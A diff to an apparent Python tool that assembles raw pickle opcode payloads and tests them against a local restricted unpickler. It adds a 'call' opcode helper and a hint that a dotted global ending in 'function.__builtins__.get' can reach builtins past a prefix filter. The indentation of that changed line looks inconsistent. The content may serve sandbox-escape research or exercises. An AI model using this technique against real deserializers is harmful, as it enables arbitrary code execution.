@@ -170,7 +170,7 @@ if source_path:
         print("dotted_name_resolution=CPython find_class resolves protocol>=4 dotted names by repeated getattr")
     if "startswith" in text:
         print("prefix_filter_review=check whether the filter applies only to the complete requested name; an allowed leading object may expose nested attributes")
-    print("mapping_note=pickle has no GETATTR or GETITEM opcode; GET/BINGET read memo slots. Obtain a bound mapping method through an allowed dotted global and invoke it with REDUCE")
+        print("mapping_note=pickle has no GETATTR or GETITEM opcode; GET/BINGET read memo slots. A dotted global ending in function.__builtins__.get can resolve a bound mapping method; invoke it with a tuple and REDUCE")
 
 raw = load_payload(payload_value, payload_format)
 if raw is not None:
@@ -318,6 +318,15 @@ for index, item in enumerate(operations):
             raise ValueError(f"operation {index}: REDUCE needs callable and argument tuple")
         payload.extend(b"R")
         depth -= 1
+    elif op == "call":
+        count = item.get("count")
+        if not isinstance(count, int) or count < 0 or count > 3:
+            raise ValueError(f"operation {index}: call count must be within 0..3")
+        if depth < count + 1:
+            raise ValueError(f"operation {index}: call needs a callable and {count} arguments")
+        payload.extend((b")", b"\x85", b"\x86", b"\x87")[count])
+        payload.extend(b"R")
+        depth -= count
     elif op == "memoize":
         if depth < 1:
             raise ValueError(f"operation {index}: MEMOIZE needs a stack item")
@@ -382,7 +391,8 @@ if validator_path:
 
         Pass a JSON list using ``global`` (module/name), ``string`` (value),
         ``bytes`` (base64), ``int`` (value), ``none``, ``tuple`` (count 0..3),
-        ``reduce``, ``memoize``, ``get`` (index), ``pop``, or ``dup``. The tool
+        ``reduce``, ``call`` (count 0..3, emits tuple plus REDUCE), ``memoize``,
+        ``get`` (index), ``pop``, or ``dup``. The tool
         owns opcode bytes, checks stack depth, writes and disassembles the exact
         payload, and can invoke the local restricted validator.
         """
